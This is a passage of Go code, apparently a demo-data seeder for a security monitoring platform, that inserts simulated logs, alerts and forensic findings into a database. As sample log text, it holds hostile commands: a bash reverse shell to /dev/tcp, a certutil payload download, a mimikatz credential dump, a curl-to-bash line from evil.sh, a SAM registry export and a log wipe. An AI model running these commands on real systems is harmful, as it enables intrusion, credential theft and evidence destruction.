		{2, "SMB Lateral Movement — Overnight", "completed", 8, "analyst-1", 12},
		{3, "PowerShell Sweep", "running", 0, "analyst-3", 0},
	}
	now := time.Now()
	for _, r := range runs {
		tmplID := 0
		if r.tmplIdx < len(templateIDs) {
			tmplID = templateIDs[r.tmplIdx]
		}
		var completedAt interface{}
		if r.status == "completed" {
			completedAt = now.Add(-time.Duration(r.hoursAgo-1) * time.Hour)
		}
		findings := `[{"ip":"185.220.101.47","count":14,"severity":"critical"}]`
		mustExec(db, `
			INSERT INTO hunt_runs
				(template_id, tenant_id, name, kql_query, status, hit_count, findings, analyst, severity, started_at, completed_at)
			VALUES ($1,9999,$2,'source=network | stats count',$3,$4,$5::jsonb,$6,'high',$7,$8)`,
			tmplID, r.name, r.status, r.hitCount, findings, r.analyst,
			now.Add(-time.Duration(r.hoursAgo)*time.Hour), completedAt,
		)
	}
}

func seedEndpointLogs(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	logs := []struct {
		agentIdx  int
		logSource string
		message   string
		minsAgo   int
	}{
		{0, "syslog", `Jul 8 17:10:04 web-prod-01 sshd[5820]: Accepted publickey for root from 185.220.101.47 port 44521 ssh2`, 5},
		{0, "syslog", `Jul 8 17:09:12 web-prod-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=45.33.32.156 DST=10.0.1.10 PROTO=TCP DPT=22`, 6},
		{0, "syslog", `Jul 8 17:05:33 web-prod-01 sudo: root : TTY=pts/0 ; PWD=/tmp/.hidden ; USER=root ; COMMAND=/usr/sbin/python3 c2client.py`, 10},
		{0, "auditd", `type=EXECVE msg=audit(1720447200.001:1234): argc=4 a0="bash" a1="-i" a2=">&" a3="/dev/tcp/192.168.1.99/4444"`, 15},
		{0, "auditd", `type=SYSCALL msg=audit(1720447200.002:1235): arch=c000003e syscall=59 success=yes exe="/usr/sbin/python3"`, 15},
		{1, "syslog", `Jul 8 16:45:01 db-server-02 cron[4521]: (www-data) CMD (/tmp/.hidden/beacon)`, 40},
		{1, "mysql", `2026-07-08T16:30:22.123 [ERROR] Access denied for user 'root'@'10.0.2.55' (using password: YES) -- 42 attempts`, 45},
		{1, "syslog", `Jul 8 16:00:11 db-server-02 kernel: EXT4-fs error (device sdb1): ext4_find_entry:1455: inode #2: comm tar: reading directory lblock 0`, 75},
		{2, "winevent", `EventID=4624 Account=Administrator Source=10.0.2.55 LogonType=3 AuthPkg=NTLM ComputerName=dc-01`, 90},
		{2, "winevent", `EventID=4688 Process=mimikatz.exe CommandLine="mimikatz.exe privilege::debug sekurlsa::logonpasswords" User=Administrator`, 43},
		{2, "winevent", `EventID=4698 TaskName=\WindowsUpdate_Helper Action=cmd.exe /c certutil -urlcache -split -f http://185.220.101.47/payload.exe`, 200},
		{2, "winevent", `EventID=1102 Log=Security Source=EventLog-WinRM Message="The audit log was cleared." User=SYSTEM`, 220},
		{3, "android", `07-08 14:22:11.234 W/PackageManager: Attempting to install com.hacker.spyware from unknown source`, 260},
		{3, "android", `07-08 14:20:05.123 I/adb: USB debugging enabled on device android-mobile-01`, 262},
	}
	for _, l := range logs {
		agentID := agentIDs[l.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO endpoint_logs (agent_id, tenant_id, log_source, log_message, collected_at)
			VALUES ($1,9999,$2,$3,$4)`,
			agentID, l.logSource, l.message,
			now.Add(-time.Duration(l.minsAgo)*time.Minute),
		)
	}
}

func seedLogSources(db *sql.DB, agentIDs []int) {
	sources := []struct {
		name, srcType, deviceType, format string
		agentIdx                          int
		eventCount                        int
	}{
		{"web-prod-01 syslog", "syslog", "linux_server", "syslog", 0, 48231},
		{"db-server-02 syslog", "syslog", "linux_server", "syslog", 1, 31045},
		{"win-workstation-05 WinEvent", "winevent", "windows_workstation", "evtx", 2, 22890},
		{"android-mobile-01 logcat", "android", "android_device", "json", 3, 5421},
		{"Palo Alto NGFW", "syslog", "firewall", "cef", -1, 182450},
		{"AWS CloudTrail", "api", "cloud", "json", -1, 74231},
		{"Nginx Access Logs", "flatfile", "web_server", "combined", 0, 94520},
		{"MySQL Slow Query Log", "flatfile", "database", "plaintext", 1, 2341},
	}
	for _, s := range sources {
		var agentID *int
		if s.agentIdx >= 0 && s.agentIdx < len(agentIDs) {
			id := agentIDs[s.agentIdx]
			agentID = &id
		}
		mustExec(db, `
			INSERT INTO log_sources
				(tenant_id, name, source_type, device_type, format, agent_id, enabled, event_count, last_event)
			VALUES (9999,$1,$2,$3,$4,$5,true,$6,now()-interval '2 minutes')
			ON CONFLICT DO NOTHING`,
			s.name, s.srcType, s.deviceType, s.format, agentID, s.eventCount,
		)
	}
}

func seedNetworkConnections(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	conns := []struct {
		agentIdx    int
		proto       string
		local       string
		remote      string
		state       string
		country     string
		countryCode string
		bytesSent   int64
		bytesRecv   int64
	}{
		{0, "tcp", "10.0.1.10:52341", "185.220.101.47:443", "ESTABLISHED", "Germany", "DE", 42000, 8100},
		{0, "tcp", "10.0.1.10:80", "10.0.2.55:51234", "ESTABLISHED", "Internal", "INT", 1024, 2048},
		{0, "tcp", "10.0.1.10:22", "10.0.1.5:44521", "ESTABLISHED", "Internal", "INT", 512, 1024},
		{0, "tcp", "10.0.1.10:53412", "94.102.49.190:443", "TIME_WAIT", "Russia", "RU", 15728640, 102400},
		{1, "tcp", "10.0.1.20:3306", "10.0.2.55:34521", "ESTABLISHED", "Internal", "INT", 20480, 102400},
		{1, "tcp", "10.0.1.20:22", "10.0.1.5:54321", "ESTABLISHED", "Internal", "INT", 1024, 512},
		{2, "tcp", "10.0.2.55:445", "10.0.1.5:58921", "ESTABLISHED", "Internal", "INT", 1048576, 2097152},
		{2, "tcp", "10.0.2.55:3389", "10.0.1.5:3389", "LISTEN", "Internal", "INT", 0, 0},
		{3, "tcp", "192.168.1.88:58321", "203.0.113.42:8080", "ESTABLISHED", "China", "CN", 8192, 32768},
	}
	for _, c := range conns {
		agentID := agentIDs[c.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO endpoint_connections
				(agent_id, protocol, local_address, remote_address, state, country, country_code, collected_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,9999)`,
			agentID, c.proto, c.local, c.remote, c.state, c.country, c.countryCode, now,
		)
		mustExec(db, `
			INSERT INTO network_connect_events
				(agent_id, tenant_id, comm, protocol, local_address, remote_address, state, bytes_sent, bytes_recv, created_at)
			VALUES ($1,9999,'nginx',$2,$3,$4,$5,$6,$7,$8)`,
			agentID, c.proto, c.local, c.remote, c.state, c.bytesSent, c.bytesRecv, now,
		)
	}
}

func seedRiskPosture(db *sql.DB) {
	now := time.Now()
	snapshots := []struct {
		score, vuln, ueba, alert, ioc int
		daysAgo                       int
	}{
		{82, 30, 20, 25, 7, 30},
		{78, 32, 22, 18, 6, 25},
		{75, 35, 25, 12, 3, 20},
		{71, 38, 28, 15, 5, 15},
		{68, 36, 32, 20, 8, 10},
		{72, 33, 28, 22, 10, 5},
		{69, 35, 30, 24, 12, 2},
		{49, 40, 35, 35, 15, 0},
	}
	assetScores := `[{"name":"web-prod-01","score":55},{"name":"db-server-02","score":48},{"name":"win-workstation-05","score":35}]`
	for _, s := range snapshots {
		mustExec(db, `
			INSERT INTO risk_posture_snapshots
				(tenant_id, score, vuln_score, ueba_score, alert_score, ioc_score, asset_scores, snapshot_at)
			VALUES (9999,$1,$2,$3,$4,$5,$6::jsonb,$7)`,
			s.score, s.vuln, s.ueba, s.alert, s.ioc, assetScores,
			now.AddDate(0, 0, -s.daysAgo),
		)
	}
}

func seedITDR(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	findings := []struct {
		findingType, severity, identity, idType, srcIP, desc, technique, status string
		agentIdx                                                                  int
		minsAgo                                                                   int
	}{
		{"credential_theft", "critical", "admin", "user", "10.0.2.55", "Admin credentials extracted via mimikatz — NTLM hash captured", "T1003.001", "open", 2, 43},
		{"lateral_movement", "high", "jdoe", "user", "10.0.2.55", "Pass-the-hash lateral movement from workstation to DC detected", "T1550.002", "investigating", 2, 120},
		{"impossible_travel", "high", "jdoe", "user", "41.184.102.17", "Login from Nigeria 30 minutes after New York login — impossible travel", "T1078", "open", 2, 300},
		{"privilege_escalation", "critical", "svc_backdoor", "service_account", "10.0.1.10", "New service account created and immediately used for network scanning", "T1078.003", "open", 0, 45},
		{"brute_force", "medium", "admin", "user", "45.33.32.156", "42 failed SSH attempts in 60 seconds from external IP", "T1110.001", "resolved", 0, 90},
		{"account_compromise", "critical", "admin", "user", "10.0.2.55", "Admin account accessed LSASS and created new backdoor user svc_backdoor", "T1003.001", "open", 2, 43},
	}
	for _, f := range findings {
		agentID := agentIDs[f.agentIdx%len(agentIDs)]
		evidence := fmt.Sprintf(`{"alert_ids":[1,2,3],"host":"%s"}`, "10.0.2.55")
		dedup := fmt.Sprintf("itdr-%s-%s", f.findingType, f.identity)
		mustExec(db, `
			INSERT INTO itdr_findings
				(tenant_id, finding_type, severity, identity, identity_type, source_ip, description, evidence, mitre_technique, status, agent_id, dedup_key, created_at)
			VALUES (9999,$1,$2,$3,$4,$5,$6,$7::jsonb,$8,$9,$10,$11,$12)
			ON CONFLICT DO NOTHING`,
			f.findingType, f.severity, f.identity, f.idType, f.srcIP, f.desc,
			evidence, f.technique, f.status, agentID, dedup,
			now.Add(-time.Duration(f.minsAgo)*time.Minute),
		)
	}
}

func seedDFIR(db *sql.DB, agentIDs, incidentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	collections := []struct {
		agentIdx      int
		incidentIdx   int
		label         string
		status        string
		triggeredBy   string
		artifactTypes string
		hoursAgo      int
	}{
		{0, 0, "C2 Implant Forensic Collection — web-prod-01", "completed", "auto-soar", `{"memory","processes","network","files"}`, 1},
		{2, 1, "Credential Theft Collection — win-workstation-05", "completed", "analyst-2", `{"memory","registry","event_logs"}`, 3},
		{1, 2, "Ransomware DFIR — db-server-02", "completed", "auto-soar", `{"memory","files","network","event_logs"}`, 8},
	}
	for i, c := range collections {
		agentID := agentIDs[c.agentIdx%len(agentIDs)]
		var incidentID *int
		if i < len(incidentIDs) {
			incidentID = &incidentIDs[i]
		}
		var collID int
		err := db.QueryRow(`
			INSERT INTO forensic_collections
				(tenant_id, incident_id, agent_id, label, status, artifact_types, triggered_by, started_at, completed_at, created_at)
			VALUES (9999,$1,$2,$3,$4,$5::text[],$6,$7,$8,$9)
			RETURNING id`,
			incidentID, agentID, c.label, c.status, "{"+c.artifactTypes+"}",
			c.triggeredBy,
			now.Add(-time.Duration(c.hoursAgo)*time.Hour),
			now.Add(-time.Duration(c.hoursAgo-1)*time.Hour),
			now.Add(-time.Duration(c.hoursAgo)*time.Hour),
		).Scan(&collID)
		if err != nil {
			log.Printf("dfir collection: %v", err)
			continue
		}
		artifacts := []struct {
			artifactType string
			itemCount    int
			data         string
		}{
			{"processes", 48, `[{"pid":6001,"name":"python3","cmdline":"/tmp/.hidden/c2client.py","suspicious":true}]`},
			{"network", 12, `[{"remote_ip":"185.220.101.47","port":443,"state":"ESTABLISHED","pid":6001}]`},
			{"files", 3, `[{"path":"/tmp/.hidden/beacon","hash":"275a021b","size":52480}]`},
		}
		for _, a := range artifacts {
			mustExec(db, `
				INSERT INTO forensic_artifacts
					(collection_id, tenant_id, agent_id, artifact_type, data, item_count, collected_at)
				VALUES ($1,9999,$2,$3,$4::jsonb,$5,$6)`,
				collID, agentID, a.artifactType, a.data, a.itemCount,
				now.Add(-time.Duration(c.hoursAgo-1)*time.Hour),
			)
		}
	}
}

func seedMDM(db *sql.DB, agentIDs []int) {
	devices := []struct {
		agentIdx     int
		udid         string
		serial       string
		deviceName   string
		model        string
		platform     string
		osVersion    string
		ownerEmail   string
		isEncrypted  bool
		isJailbroken bool
		compliance   string
	}{
		{3, "demo-android-udid-001", "R28M102ABCD", "asmith-pixel7", "Pixel 7 Pro", "android", "14.0", "asmith@democorp.com", true, false, "compliant"},
		{-1, "demo-android-udid-002", "R29M203EFGH", "jdoe-galaxy-s24", "Samsung Galaxy S24", "android", "14.0", "jdoe@democorp.com", true, false, "non_compliant"},
		{-1, "demo-ios-udid-003", "IPAD-DEMO-003", "exec-ipad-pro", "iPad Pro 12.9", "ios", "17.5.1", "ceo@democorp.com", true, false, "compliant"},
	}
	for _, d := range devices {
		var agentID *int
		if d.agentIdx >= 0 && d.agentIdx < len(agentIDs) {
			id := agentIDs[d.agentIdx]
			agentID = &id
		}
		var deviceID int
		err := db.QueryRow(`
			INSERT INTO mdm_devices
				(tenant_id, agent_id, udid, serial_number, device_name, model, platform, os_version, owner_email,
				 is_encrypted, has_passcode, passcode_compliant, is_jailbroken, compliance_status, status, last_check_in)
			VALUES (9999,$1,$2,$3,$4,$5,$6,$7,$8,$9,true,true,$10,$11,'enrolled',now()-interval '5 minutes')
			ON CONFLICT (udid) DO NOTHING
			RETURNING id`,
			agentID, d.udid, d.serial, d.deviceName, d.model, d.platform, d.osVersion, d.ownerEmail,
			d.isEncrypted, d.isJailbroken, d.compliance,
		).Scan(&deviceID)
		if err != nil {
			continue
		}
		apps := []struct {
			pkg, name, version string
		}{
			{"com.google.android.gm", "Gmail", "2026.03.01"},
			{"com.slack.android", "Slack", "24.03.10"},
			{"com.microsoft.teams", "Microsoft Teams", "1456.2460"},
		}
		for _, a := range apps {
			mustExec(db, `
				INSERT INTO mdm_device_apps (device_id, tenant_id, package_name, app_name, version)
				VALUES ($1,9999,$2,$3,$4)`,
				deviceID, a.pkg, a.name, a.version,
			)
		}
	}
}

func seedIdentity(db *sql.DB) {
	users := []struct {
		username, displayName, email, dept, title, manager, status string
		groups                                                      string
	}{
		{"admin", "System Administrator", "admin@democorp.com", "IT Security", "Security Admin", "CISO", "active", `{"Domain Admins","Security"}` },
		{"jdoe", "John Doe", "jdoe@democorp.com", "Engineering", "Senior Engineer", "alice.m", "active", `{"Engineering","VPN Users"}`},
		{"asmith", "Alice Smith", "asmith@democorp.com", "Sales", "Account Executive", "vp.sales", "active", `{"Sales","Remote Users"}`},
		{"svc_backdoor", "Service Account (Backdoor)", "", "IT", "Service Account", "", "suspicious", `{"Domain Users"}`},
		{"bwilson", "Bob Wilson", "bwilson@democorp.com", "Finance", "Finance Manager", "cfo", "active", `{"Finance","Accounting"}`},
	}
	for _, u := range users {
		mustExec(db, `
			INSERT INTO identity_cache
				(tenant_id, username, display_name, email, department, title, manager, groups, account_status, last_logon)
			VALUES (9999,$1,$2,$3,$4,$5,$6,$7::text[],$8,now()-interval '1 hour')
			ON CONFLICT DO NOTHING`,
			u.username, u.displayName, u.email, u.dept, u.title, u.manager,
			"{"+u.groups+"}", u.status,
		)
	}
}

func seedCorrelation(db *sql.DB) {
	rules := []struct {
		name, desc, severity, ruleName, technique, action, corrType, condValue string
		windowMins, threshold                                                    int
	}{
		{"C2 + Lateral Movement Chain", "Correlates C2 beacon with subsequent lateral movement within 60 minutes", "critical", "C2 Beacon Detected", "T1071.001", "create_incident", "temporal", "lateral_movement", 60, 2},
		{"Credential Dump → Privilege Escalation", "Links credential dump with privilege escalation from same host", "critical", "Credential Dump — LSASS", "T1003.001", "escalate", "causal", "privilege_escalation", 30, 1},
		{"Brute Force → Successful Login", "Detects successful login following 20+ failures from same IP", "high", "SSH Brute Force", "T1110.001", "block_ip", "threshold", "success", 10, 20},
		{"Multiple Persistence Mechanisms", "Alerts when 3+ persistence techniques detected on same host in 24h", "high", "Suspicious Cron Job", "T1053", "notify", "threshold", "", 1440, 3},
	}
	for _, r := range rules {
		mustExec(db, `
			INSERT INTO correlation_rules
				(name, description, severity, rule_name, mitre_technique, action, correlation_type, condition_value, window_minutes, threshold, enabled, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,true,9999)
			ON CONFLICT DO NOTHING`,
			r.name, r.desc, r.severity, r.ruleName, r.technique, r.action, r.corrType, r.condValue, r.windowMins, r.threshold,
		)
	}
}

func seedHoneyports(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	ports := []struct {
		agentIdx    int
		port        int
		proto       string
		desc        string
		severity    string
	}{
		{0, 4444, "tcp", "Meterpreter listener honeypot — any connection is a threat signal", "critical"},
		{0, 1433, "tcp", "Fake MSSQL honeypot — detects lateral SQL connection attempts", "high"},
		{1, 27017, "tcp", "Fake MongoDB honeypot — external DB access attempts", "high"},
		{2, 5985, "tcp", "WinRM honeypot — detects remote management lateral movement", "medium"},
	}
	for _, p := range ports {
		agentID := agentIDs[p.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO honeyports
				(tenant_id, agent_id, port, protocol, description, alert_severity, is_active)
			VALUES (9999,$1,$2,$3,$4,$5,true)
			ON CONFLICT DO NOTHING`,
			agentID, p.port, p.proto, p.desc, p.severity,
		)
	}
}

func seedEndpointUsers(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	users := []struct {
		agentIdx int
		username string
		uid      int
		shell    string
	}{
		{0, "root", 0, "/bin/bash"},
		{0, "www-data", 33, "/usr/sbin/nologin"},
		{0, "svc_backdoor", 1001, "/bin/bash"},
		{1, "root", 0, "/bin/bash"},
		{1, "mysql", 999, "/bin/false"},
		{1, "www-data", 33, "/usr/sbin/nologin"},
		{2, "Administrator", 500, "cmd.exe"},
		{2, "SYSTEM", 18, ""},
		{2, "jdoe", 1001, "powershell.exe"},
	}
	for _, u := range users {
		agentID := agentIDs[u.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO endpoint_users
				(agent_id, username, uid, shell, collected_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,9999)`,
			agentID, u.username, u.uid, u.shell, now,
		)
	}
}

func seedSOARExecutions(db *sql.DB, agentIDs []int, playbookIDs []int) {
	if len(playbookIDs) == 0 || len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	type exec struct {
		pbIdx      int
		agentIdx   int
		actionType string
		alertRule  string
		status     string
		overall    string
		stepsTotal int
		stepsOK    int
		stepsFail  int
		durationMs int
		minsAgo    int
	}
	execs := []exec{
		{0, 0, "isolate_agent", "Ransomware: Mass File Encryption Detected", "completed", "completed", 4, 4, 0, 2340, 480},
		{2, 1, "block_ip", "Brute Force: SSH Login Failures > 50", "completed", "completed", 3, 3, 0, 890, 360},
		{3, 2, "create_case", "Incident Escalation: C2 Beacon Confirmed", "completed", "completed", 5, 5, 0, 1200, 300},
		{1, 0, "notify_slack", "Critical: Cobalt Strike Implant Detected", "completed", "completed", 2, 2, 0, 450, 240},
		{0, 1, "isolate_agent", "Ransomware: Encrypted File Extension Detected", "completed", "completed", 4, 3, 1, 3100, 180},
		{2, 2, "block_ip", "Network Scan: Port Sweep from Internal Host", "completed", "completed", 3, 3, 0, 670, 120},
		{1, 0, "notify_slack", "Critical: LSASS Credential Dump", "completed", "completed", 2, 2, 0, 320, 90},
		{3, 1, "create_case", "Incident Escalation: Lateral Movement Chain", "completed", "completed", 5, 4, 0, 1450, 60},
	}
	for _, e := range execs {
		pbID := playbookIDs[e.pbIdx%len(playbookIDs)]
		agentID := agentIDs[e.agentIdx%len(agentIDs)]
		mustExec(db, `
			INSERT INTO playbook_executions
				(playbook_id, agent_id, alert_rule, action_type, status, overall_status,
				 steps_total, steps_ok, steps_failed, duration_ms, created_at, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,9999)`,
			pbID, agentID, e.alertRule, e.actionType, e.status, e.overall,
			e.stepsTotal, e.stepsOK, e.stepsFail, e.durationMs,
			now.Add(-time.Duration(e.minsAgo)*time.Minute),
		)
	}
}

func seedCloudInfraAlerts(db *sql.DB, agentIDs []int) {
	if len(agentIDs) == 0 {
		return
	}
	now := time.Now()
	type alert struct {
		agentIdx  int
		severity  string
		rule      string
		message   string
		tactic    string
		technique string
		mitreName string
		minsAgo   int
	}
	alerts := []alert{
		// Cloud Security — AWS/Azure/GCP
		{0, "critical", "AWS S3 Bucket Made Public", "S3 bucket prod-backups-us-east-1 ACL changed to public-read by IAM user ci-deploy. 847 objects now publicly accessible.", "Exfiltration", "T1530", "Data from Cloud Storage", 55},
		{0, "high", "AWS IAM Privilege Escalation", "User staging-ci attached AdministratorAccess policy to itself via iam:AttachUserPolicy. Account: 123456789012.", "Privilege Escalation", "T1078.004", "Cloud Accounts", 130},
		{1, "critical", "Azure AD Global Admin Granted", "Global Administrator role assigned to external guest user attacker@evil.com by admin@corp.com.", "Persistence", "T1098.003", "Additional Cloud Credentials", 210},
		{1, "high", "Azure Login from Impossible Travel", "User jdoe@corp.com authenticated from London (prev. NYC, 8 min gap). IP: 185.220.101.12.", "Credential Access", "T1110", "Brute Force", 320},
		{2, "high", "GCP Service Account Key Created", "Service account compute-engine@project.iam.gserviceaccount.com had new JSON key (ID: 1a2b3c) created by admin user outside business hours.", "Persistence", "T1098.001", "Additional Cloud Credentials", 410},
		{2, "medium", "GCP Cloud Run Deployed from Untrusted Source", "Cloud Run service data-processor deployed from unverified container image gcr.io/third-party/scraper:latest.", "Execution", "T1610", "Deploy Container", 520},
		// Email Security
		{0, "critical", "Phishing: CEO Impersonation BEC", "Email from ceo@corp-secure.com (lookalike) requesting $85,000 wire transfer. Sent to finance@corp.com. SPF/DKIM fail.", "Initial Access", "T1566.001", "Spearphishing Attachment", 75},
		{0, "high", "Credential Phishing: Fake O365 Login", "Email with credential phishing link to http://login.microsoftonline.com.malicious.ru/index.html sent to 23 users.", "Credential Access", "T1598.002", "Spearphishing Link", 160},
		{1, "high", "BEC: Financial Request Pattern Matched", "Email thread detected with BEC financial trigger keywords: 'wire transfer', 'urgent', 'today only'. From: billing@vendor-legit.com.", "Collection", "T1114", "Email Collection", 270},
		{1, "medium", "Lookalike Domain: corp0.com Detected", "Inbound email from admin@corp0.com (edit-distance 1 from corp.com). Possible typosquatting attack.", "Initial Access", "T1566", "Phishing", 380},
		{2, "high", "Mass Outbound Email: Data Exfil Risk", "User svc_backdoor@corp.com sent 312 emails in 10 minutes to external addresses. Attachment: db_export.zip.", "Exfiltration", "T1048.003", "Exfiltration Over Unencrypted Protocol", 490},
		// Container Security
		{0, "critical", "Privileged Container Escape Attempt", "Container xcloak-api running with --privileged flag attempted host filesystem mount via nsenter. Falco rule triggered.", "Privilege Escalation", "T1611", "Escape to Host", 85},
		{1, "critical", "Cryptomining: xmrig Detected in Container", "Process xmrig found in container worker-8 connecting to pool.minexmr.com:4444 (stratum+tcp). CPU 99%.", "Impact", "T1496", "Resource Hijacking", 195},
		{0, "high", "Kubernetes ClusterRole Binding Escalation", "ServiceAccount default:backend granted cluster-admin via ClusterRoleBinding created by unknown kubectl session.", "Privilege Escalation", "T1078.001", "Default Accounts", 275},
		{1, "high", "Docker Socket Exposed in Container", "Container data-processor mounted /var/run/docker.sock. Allows full Docker daemon control and container escape.", "Defense Evasion", "T1610", "Deploy Container", 365},
		// AD Attacks
		{2, "critical", "Kerberoasting: 14 SPNs Targeted", "Host win-attacker requested Kerberos TGS tickets for 14 service accounts in 90s. Classic Kerberoasting pattern.", "Credential Access", "T1558.003", "Kerberoasting", 95},
		{2, "critical", "DCSync: Credential Dump via AD Replication", "Host win-workstation-05 called DRSGetNCChanges against dc-01. Non-DC machine replicating AD — DCSync attack.", "Credential Access", "T1003.006", "DCSync", 165},
		{0, "high", "AS-REP Roasting: Pre-Auth Disabled Users", "3 accounts with Kerberos pre-auth disabled targeted: svc_sql, svc_backup, svc_print. TGTs captured by attacker.", "Credential Access", "T1558.004", "AS-REP Roasting", 245},
		{1, "high", "BloodHound: AD Enumeration Detected", "SharpHound collector running on win-workstation-08. LDAP queries matching BloodHound session enumeration pattern.", "Discovery", "T1018", "Remote System Discovery", 340},
		{2, "high", "Pass-the-Hash: NTLM Lateral Movement", "Source win-workstation-05 authenticated to dc-01 and file-srv-02 using NTLM hash (no password). PTH attack confirmed.", "Lateral Movement", "T1550.002", "Pass the Hash", 420},
		// Supply Chain
		{0, "critical", "Curl-to-Shell: Remote Installer Detected", "Process: curl https://evil.sh | bash run as root in CI pipeline stage build-prod. Confirmed RCE via supply chain.", "Execution", "T1059.004", "Unix Shell", 105},
		{1, "high", "Dependency Confusion: Internal Package Hijack", "npm install pulled @corp/auth-utils 3.1.0 from public registry instead of private Artifactory. Typo in package.json.", "Initial Access", "T1195.001", "Compromise Software Dependencies", 200},
		{0, "high", "Typosquatting: reqeusts Package Installed", "pip install reqeusts (typo of requests) detected in dev-build pipeline. Package contains credential harvester.", "Initial Access", "T1195.001", "Compromise Software Dependencies", 290},
		{2, "medium", "Build Injection: Makefile Modified", "Makefile in repo auth-service was modified to run compile in stage with extra curl download before compilation step.", "Execution", "T1059.004", "Unix Shell", 400},
		// OT/ICS
		{0, "critical", "ICS Port Scan: Modbus/TCP Sweep", "Host 192.168.50.12 scanned all OT VLAN hosts on ports 502 (Modbus), 102 (S7comm), 44818 (EtherNet/IP). ICS enumeration.", "Discovery", "T1046", "Network Service Discovery", 115},
		{1, "critical", "PLC Programming Mode Activated", "Engineering workstation EWS-01 sent Siemens S7comm Stop+Program mode command to PLC at 192.168.100.5. Unauthorized.", "Inhibit Response Function", "T0858", "Change Operating Mode", 220},
		{0, "high", "Historian Access from IT Network", "SCADA historian server HIST-01 accessed from IT subnet 10.0.0.0/8 via OPC-UA protocol. IT→OT bridging detected.", "Collection", "T0802", "Automated Collection", 330},
		{2, "high", "Safety System Bypass Attempt", "Write command to Safety Instrumented System (SIS) controller blocked by safety PLC. Source: OT-workstation-03.", "Manipulation", "T0858", "Change Operating Mode", 450},
		// Process Injection
		{2, "critical", "LSASS Memory Dump via MiniDump", "Process mimikatz.exe (renamed as svchost.exe) opened LSASS with MiniDumpWriteDump. Credential harvest confirmed.", "Credential Access", "T1003.001", "LSASS Memory", 125},
		{2, "critical", "CreateRemoteThread: Process Injection Detected", "explorer.exe spawned remote thread into lsass.exe via CreateRemoteThread API. Reflective DLL injection pattern.", "Defense Evasion", "T1055.001", "Dynamic-link Library Injection", 215},
		{0, "high", "Process Hollowing: svchost Replacement", "Legitimate svchost.exe process hollowed and replaced with malicious payload. Memory region marked RWX.", "Defense Evasion", "T1055.012", "Process Hollowing", 310},
		{1, "high", "SAM Credential Dump via Registry", "reg save HKLM\\SAM C:\\Users\\Public\\sam.bak executed by user jdoe. SAM credential database exported.", "Credential Access", "T1003.002", "Security Account Manager", 410},
		{0, "medium", "Reflective DLL Injection: Unsigned DLL Loaded", "Process powershell.exe loaded unsigned dll from temp path C:\\Users\\Public\\helper.dll via reflective injection.", "Defense Evasion", "T1055.001", "Dynamic-link Library Injection", 490},
		// Defense Evasion
		{2, "critical", "Event Log Cleared: Security Log Wiped", "Windows Security event log cleared by SYSTEM account on dc-01. 14,823 events destroyed. wevtutil cl Security.", "Defense Evasion", "T1070.001", "Clear Windows Event Logs", 135},
		{0, "high", "AMSI Bypass: AmsiScanBuffer Patch", "PowerShell process patched AmsiScanBuffer in memory via reflection. AMSI evasion before malware execution.", "Defense Evasion", "T1562.001", "Disable or Modify Tools", 230},
		{1, "high", "UAC Bypass: Event Viewer Hijack", "cmd.exe spawned with High integrity via eventvwr.exe HKCU registry hijack. UAC bypass without prompt.", "Privilege Escalation", "T1548.002", "Bypass User Account Control", 320},
		{2, "high", "Windows Defender Disabled via Registry", "Registry key HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware set to 1 by svc_backdoor.", "Defense Evasion", "T1562.001", "Disable or Modify Tools", 420},
		{0, "medium", "ETW Patch: Audit Policy Disabled", "EtwEventWrite function NOP-patched in ntdll.dll by process inject-tool.exe. Event Tracing for Windows disabled.", "Defense Evasion", "T1562.006", "Disable or Modify Linux Audit System", 520},
	}

	for i, a := range alerts {
		agentID := agentIDs[a.agentIdx%len(agentIDs)]
		fingerprint := fmt.Sprintf("cloud-infra-%d-%d", i, a.minsAgo)
		mustExec(db, `
			INSERT INTO alerts
				(agent_id, severity, rule_name, log_message, created_at,
				 mitre_tactic, mitre_technique, mitre_name, status, fingerprint, tenant_id)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,'open',$9,9999)`,
			agentID, a.severity, a.rule, a.message,
			now.Add(-time.Duration(a.minsAgo)*time.Minute),
			a.tactic, a.technique, a.mitreName, fingerprint,
		)
	}
}
